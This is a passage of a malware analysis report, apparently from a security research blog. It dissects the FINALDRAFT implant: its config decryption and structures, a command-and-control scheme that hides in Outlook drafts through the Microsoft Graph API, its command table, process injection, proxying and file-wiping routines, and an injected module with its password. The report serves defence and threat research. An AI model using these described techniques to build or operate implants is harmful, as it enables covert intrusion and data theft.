follows:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`uint64_t decryption_key = 0;\ndo\n  decryption_key = *data_source++ + 31 * decryption_key;\nwhile ( data_source != \u0026data_source[data_source_length] );\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Decryption key derivation algorithm\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The configuration structure is described as follows:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`struct Configuration // sizeof=0x149a\n{\n  char c2_hosts_or_refresh_token[5000];\n  char pastebin_url[200];\n  char guid[36];\n  uint8_t unknown_0[4];\n  uint16_t build_id;\n  uint32_t sleep_value;\n  uint8_t communication_method;\n  uint8_t aes_encryption_key[16];\n  bool get_external_ip_address;\n  uint8_t unknown_1[10]\n};\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Configuration structure\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The configuration is consistent across variants and versions, although not all fields are utilized. For example, the communication method field wasn't used in the main variant at the time of this publication, and only the MSGraph/Outlook method was used. However, this is not the case in the ELF variant or prior versions of FINALDRAFT.\"}),`\n`,(0,i.jsx)(e.p,{children:\"The configuration also contains a Pastebin URL, which isn\\u2019t used across any of the variants. However, this URL was quite useful to us for pivoting from the initial sample.\"}),`\n`,(0,i.jsx)(e.h4,{id:\"session-id-derivation-process\",children:\"Session ID derivation process\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The session ID used for communication between FINALDRAFT and C2 is generated by creating a random GUID, which is then processed using the \",(0,i.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function\",rel:\"nofollow\",children:\"Fowler-Noll-Vo\"}),\" (FNV) hash function.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image43.png\",alt:\"FINALDRAFT client ID generation\",width:\"433\",height:\"84\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"communication-protocol\",children:\"Communication protocol\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"During our analysis, we discovered that different communication methods are available from the configuration; however, the most contemporary sample at this time uses only the \",(0,i.jsx)(e.code,{children:\"COutlookTrans\"}),\" class, which abuses the Outlook mail service via the Microsoft Graph API. This same technique was observed in \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns\",rel:\"nofollow\",children:\"SIESTAGRAPH\"}),\", a previously unknown malware family reported by Elastic Security Labs in February 2023 and attributed to a PRC-affiliated threat group.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The Microsoft Graph API token is obtained by FINALDRAFT using the \",(0,i.jsx)(e.a,{href:\"https://login.microsoftonline.com/common/oauth2/token\",rel:\"nofollow\",children:\"https://login.microsoftonline.com/common/oauth2/token\"}),\" endpoint. The refresh token used for this endpoint is located in the configuration.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image36.png\",alt:\"Building refresh token request\",width:\"882\",height:\"215\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image40.png\",alt:\"Token refresh POST request\",width:\"802\",height:\"316\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Once refreshed, the Microsoft Graph API token is stored in the following registry paths based on whether the user has administrator privileges:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID\\\\\u003cuuid_from_configuration\u003e\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID\\\\\u003cuuid_from_configuration\u003e\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"This token is reused across requests, if it is still valid.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image3.png\",alt:\"Storing refresh token in the registry\",width:\"925\",height:\"288\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The communication loop is described as follows:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Create a session email draft if it doesn\\u2019t already exist.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Read and delete command request email drafts created by the C2.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Process commands\"}),`\n`,(0,i.jsx)(e.li,{children:\"Write command response emails as drafts for each processed command.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"A check is performed to determine whether a session email, in the form of a command response email identified by the subject \",(0,i.jsx)(e.code,{children:\"p_\u003csession-id\u003e\"}),\", already exists. If it does not, one is created in the mail drafts. The content of this email is base64 encoded but not AES encrypted.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image19.png\",alt:\"Check for session email and create one if it doesn't exist\",width:\"706\",height:\"60\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image46.png\",alt:\"Session email: GET and POST requests\",width:\"808\",height:\"133\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The session data is described in the structure below.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`struct Session\n{\n  char random_bytes[30];\n  uint32_t total_size;\n  char field_22;\n  uint64_t session_id;\n  uint64_t build_number;\n  char field_33;\n};\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Session data structure\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The command queue is filled by checking the last five C2 command request emails in the mail drafts, which have subjects \",(0,i.jsx)(e.code,{children:\"r_\u003csession-id\u003e\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image39.png\",alt:\"Checking for commands email\",width:\"617\",height:\"145\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image49.png\",alt:\"Command polling GET request\",width:\"1030\",height:\"52\"})}),`\n`,(0,i.jsx)(e.p,{children:\"After reading the request, emails are then deleted.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image15.png\",alt:\"Deleting command email after reading\",width:\"586\",height:\"54\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Commands are then processed, and responses are written into new draft emails, each with the same \",(0,i.jsx)(e.code,{children:\"p_\u003csession-id\u003e\"}),\" subject for each command response.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image13.png\",alt:\"Command response POST request\",width:\"976\",height:\"77\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Content for message requests and responses are \",(0,i.jsx)(e.strong,{children:\"Zlib\"}),\" compressed, \",(0,i.jsx)(e.strong,{children:\"AES CBC\"}),\" encrypted, and Base64 encoded. The AES key used for encryption and decryption is located in the configuration blob.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:\"Base64(AESEncrypt(ZlibCompress(data)))\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Request messages sent from the C2 to the implant follow this structure.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`struct C2Message{\n  struct {\n    uint8_t random_bytes[0x1E];  \n    uint32_t message_size;    \n    uint64_t session_id;      \n  } header;                     // Size: 0x2A (42 bytes)\n  \n  struct {\n    uint32_t command_size;                     \n    uint32_t next_command_struct_offset;\n    uint8_t command_id;                   \n    uint8_t unknown[8];                   \n    uint8_t command_args[];                       \n  } commands[];\n};\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Request message structure\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Response messages sent from the implant to C2 follow this structure.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`struct ImplantMessage {\n  struct Header {\n    uint8_t random_bytes[0x1E];  \n    uint32_t total_size;    \n    uint8_t flag;\t\t// Set to 1\n    uint64_t session_id;\n    uint16_t build_id;\n    uint8_t pad[6];\n  } header;\n  \n  struct Message {\n    uint32_t actual_data_size_add_0xf;\n    uint8_t command_id;\n    uint8_t unknown[8];\n    uint8_t flag_success;\n    char newline[0x2];\n    uint8_t actual_data[];\n  }                    \n};\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Response message structure\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Here is an example of data stolen by the implant.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image52.png\",alt:\"Response message example\",width:\"544\",height:\"198\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"commands\",children:\"Commands\"}),`\n`,(0,i.jsx)(e.p,{children:\"FinalDraft registers 37 command handlers, with most capabilities revolving around process injection, file manipulation, and network proxy capabilities.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image23.png\",alt:\"FINALDRAFT command handler setup\",width:\"751\",height:\"227\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Below is a table of the commands and their IDs:\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"ID\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Name\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"0\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"GatherComputerInformation\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"2\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"StartTcpServerProxyToC2\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"3\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"StopTcpServerProxyToC2\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"4\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ConnectToTcpTargetStartProxyToC2\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"5\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"SetSleepValue\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"6\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DeleteNetworkProjectorFwRuleAndStopTCPServer\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"8\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ConnectToTcpTarget\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"9\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"SendDataToUdpOrTcpTarget\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"10\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"CloseTcpConnection\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"11\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DoProcessInjectionSendOutputEx\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"12\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ListFiles\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"13\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ListAvailableDrives\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"14\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"CreateDirectory\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"15\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DeleteFileOrDirectory\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"16\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DownloadFile\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"17\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"UploadFile0\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"18\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DummyFunction\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"19\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"SetCurrentDirectory\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"20\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"GetCurrentDirectory\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"21\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ListRunningProcesses\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"24\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DoProcessInjectionNoOutput\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"25\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DoProcessInjectionNoOutput (Same as 24)\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"26\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DoProcessInjectionSendOutput1\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"28\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"DisconnectFromNamedPipe\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"30\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ConnectToNamedPipeAndProxyMessageToC2\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"31\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"GetCurrentProcessTokenInformation\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"32\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"EnumerateActiveSessions\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"33\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"ListActiveTcpUdpConnections\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"35\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"MoveFile1\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"36\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"GetOrSetFileTime\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"39\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"UploadFile1\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"41\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"MoveFile0\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"42\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"CopyFileOrCopyDirectory\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"43\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"TerminateProcess\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"44\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"CreateProcess\"})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"FINALDRAFT command handler table\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"gather-computer-information\",children:\"Gather computer information\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution of the \",(0,i.jsx)(e.code,{children:\"GatherComputerInformation\"}),\" command, information about the victim machine is collected and sent by FINALDRAFT. This information includes the computer name, the account username, internal and external IP addresses, and details about running processes.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"This structure is described as follows:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`struct ComputerInformation\n{\n  char field_0;\n  uint64_t session_id;\n  char field_9[9];\n  char username[50];\n  char computer_name[50];\n  char field_76[16];\n  char external_ip_address[20];\n  char internal_ip_address[20];\n  uint32_t sleep_value;\n  char field_B2;\n  uint32_t os_major_version;\n  uint32_t os_minor_version;\n  bool product_type;\n  uint32_t os_build_number;\n  uint16_t os_service_pack_major;\n  char field_C2[85];\n  char field_117;\n  char current_module_name[50];\n  uint32_t current_process_id;\n};\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Collected information structure\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The external IP address is collected when enabled in the configuration.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image37.png\",alt:\"Retrieve external IP if flag is set\",width:\"416\",height:\"51\"})}),`\n`,(0,i.jsx)(e.p,{children:\"This address is obtained by FINALDRAFT using the following list of public services.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.th,{align:\"left\",children:\"Public service\"})})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"hxxps://ip-api.io/json\"})})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"hxxps://ipinfo.io/json\"})})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"hxxps://myexternalip.com/raw\"})})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"hxxps://ipapi.co/json/\"})})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"hxxps://jsonip.com/\"})})})]})]})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"IP lookup service list\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"process-injection\",children:\"Process injection\"}),`\n`,(0,i.jsx)(e.p,{children:\"FINALDRAFT has multiple process injection-related commands that can inject into either running processes or create a hidden process to inject into.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In cases where a process is created, the target process is either an executable path provided as a parameter to the command or defaults to \",(0,i.jsx)(e.code,{children:\"mspaint.exe\"}),\" or \",(0,i.jsx)(e.code,{children:\"conhost.exe\"}),\" as a fallback.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image50.png\",alt:\"mspaint.exe process injection target\",width:\"757\",height:\"186\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image33.png\",alt:\"conhost.exe process injection target\",width:\"428\",height:\"97\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Depending on the command and its parameters, the process can be optionally created with its standard output handle piped. In this case, once the process is injected, FINALDRAFT reads from the pipe's output and sends its content along with the command response.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image44.png\",alt:\"Create hidden process with piped STD handles\",width:\"734\",height:\"113\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image24.png\",alt:\"Read process' piped stdout\",width:\"538\",height:\"88\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Another option exists where, instead of piping the standard handle of the process, FINALDRAFT, after creating and injecting the process, waits for the payload to create a Windows named pipe. It then connects to the pipe, writes some information to it, reads its output, and sends the data to the C2 through a separate channel. (In the case of the Outlook transport channel, this involves creating an additional draft email.).\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image58.png\",alt:\"Wait for injected process to create its named pipe\",width:\"738\",height:\"165\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image29.png\",alt:\"Read from named pipe and send to C2\",width:\"701\",height:\"98\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The process injection procedure is basic and based on \",(0,i.jsx)(e.code,{children:\"VirtualAllocEx\"}),\", \",(0,i.jsx)(e.code,{children:\"WriteProcessMemory\"}),\", and \",(0,i.jsx)(e.code,{children:\"RtlCreateUserThread\"}),\" API.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image48.png\",alt:\"Process injection method\",width:\"830\",height:\"86\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"forwarding-data-from-tcp-udp-and-named-pipes\",children:\"Forwarding data from TCP, UDP, and named pipes\"}),`\n`,(0,i.jsx)(e.p,{children:\"FINALDRAFT offers various methods of proxying data to C2, including UDP and TCP listeners, and a named pipe client.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Proxying UDP and TCP data involves handling incoming communication differently based on the protocol. For UDP, messages are received directly from the sender, while for TCP, client connections are accepted before receiving data. In both cases, the data is read from the socket and forwarded to the transport channel.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Below is an example screenshot of the \",(0,i.jsx)(e.code,{children:\"recvfrom\"}),\" call from the UDP listener.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image16.png\",alt:\"Received data from UDP client\",width:\"875\",height:\"348\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Before starting the TCP listener server, FINALDRAFT adds a rule to the Windows Firewall. This rule is removed when the server shuts down. To add/remove these rules the malware uses \",(0,i.jsx)(e.strong,{children:\"COM\"}),\" and the \",(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwpolicy2\",rel:\"nofollow\",children:\"INetFwPolicy2\"}),\" and the \",(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwrule\",rel:\"nofollow\",children:\"INetFwRule\"}),\" interfaces.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image34.png\",alt:\"FINALDRAFT adds firewall rule to allow TCP server\",width:\"781\",height:\"206\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image30.png\",alt:\"Instantiating the NetFwPolicy2 COM interface\",width:\"742\",height:\"55\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"FINALDRAFT can also establish a TCP connection to a target. In this case, it sends a magic value, \",(0,i.jsx)(e.code,{children:\"\\u201C\\\\x12\\\\x34\\\\xab\\\\xcd\\\\ff\\\\xff\\\\xcd\\\\xab\\\\x34\\\\x12\\u201D\"}),\" and expects the server to echo the same magic value back before beginning to forward the received data.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image27.png\",alt:\"Send and receive magic data to/from TCP target\",width:\"641\",height:\"198\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image18.png\",alt:\"Magic data blob\",width:\"934\",height:\"61\"})}),`\n`,(0,i.jsx)(e.p,{children:\"For the named pipe, FINALDRAFT only connects to an existing pipe. The pipe name must be provided as a parameter to the command, after which it reads the data and forwards it through a separate channel.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image31.png\",alt:\"Forward data from named pipe\",width:\"702\",height:\"209\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"file-manipulation\",children:\"File manipulation\"}),`\n`,(0,i.jsx)(e.p,{children:\"For the file deletion functionality, FINALDRAFT prevents file recovery by overwriting file data with zeros before deleting them.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image54.png\",alt:\"Zero out file before deletion\",width:\"588\",height:\"314\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"FINALDRAFT defaults to \",(0,i.jsx)(e.code,{children:\"CopyFileW\"}),\" for file copying. However, if it fails, it will attempt to copy the file at the NTFS cluster level.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"It first opens the source file as a drive handle. To retrieve the cluster size of the volume where the file resides, it uses \",(0,i.jsx)(e.code,{children:\"GetDiskFreeSpaceW\"}),\" to retrieve information about the number of sectors per cluster and bytes per sector. \",(0,i.jsx)(e.code,{children:\"DeviceIoControl\"}),\" is then called with \",(0,i.jsx)(e.code,{children:\"FSCTL_GET_RETRIEVAL_POINTERS\"}),\" to retrieve details of extents: locations on disk storing the data of the specified file and how much data is stored there in terms of cluster size.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image14.png\",alt:\"Retrieving file data extents\",width:\"803\",height:\"183\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"For each extent, it uses \",(0,i.jsx)(e.code,{children:\"SetFilePointer\"}),\" to move the source file pointer to the corresponding offset in the volume; reading and writing one cluster of data at a time from the source file to the destination file.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image57.png\",alt:\"Read/write file between clusters\",width:\"704\",height:\"525\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"If the file does not have associated cluster mappings, it is a resident file, and data is stored in the MFT itself. It uses the file's MFT index to get its raw MFT record. The record is then parsed to locate the \",(0,i.jsx)(e.code,{children:\"$DATA\"}),\" attribute (type identifier  = 128). Data is then extracted from this attribute and written to the destination file using \",(0,i.jsx)(e.code,{children:\"WriteFile\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image17.png\",alt:\"Copy resident files using MFT records\",width:\"864\",height:\"422\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"injected-modules\",children:\"Injected Modules\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Our team observed several additional modules loaded through the \",(0,i.jsx)(e.code,{children:\"DoProcessInjectionSendOutputEx\"}),\" command handler performing process injection and writing the output back through a named pipe. This shellcode injected by FINALDRAFT leverages the well-known \",(0,i.jsx)(e.a,{href:\"https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI/ShellcodeRDI.c\",rel:\"nofollow\",children:\"sRDI\"}),\" project, enabling the loading of a fully-fledged PE DLL into memory within the same process, resolving its imports and calling its export entrypoint.\"]}),`\n`,(0,i.jsxs)(e.h4,{id:\"network-enumeration-ipconfigx64dll\",children:[\"Network enumeration (\",(0,i.jsx)(e.code,{children:\"ipconfig.x64.dll\"}),\")\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This module creates a named pipe (\",(0,i.jsx)(e.code,{children:\"\\\\\\\\.\\\\Pipe\\\\E340C955-15B6-4ec9-9522-1F526E6FBBF1\"}),\") waiting for FINALDRAFT to connect to it.  Perhaps to prevent analysis/sandboxing, the threat actor used a password (\",(0,i.jsx)(e.code,{children:\"Aslire597\"}),\") as an argument, if the password is incorrect, the module will not run.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image12.png\",alt:\"String comparison with command-line password\",width:\"767\",height:\"130\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"As its name suggests, this module is a custom implementation of the ipconfig command retrieving networking information using Windows API\\u2019s (\",(0,i.jsx)(e.code,{children:\"GetAdaptersAddresses\"}),\", \",(0,i.jsx)(e.code,{children:\"GetAdaptersInfo\"}),\", \",(0,i.jsx)(e.code,{children:\"GetNetworkParams\"}),\") and reading the Windows registry keypath (\",(0,i.jsx)(e.code,{children:\"SYSTEM\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\Tcpip\\\\\\\\Parameters\\\\\\\\Interfaces\"}),\"). After the data is retrieved, it is sent back to FINALDRAFT through the named pipe.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image38.png\",alt:\"Retrieving network adapter 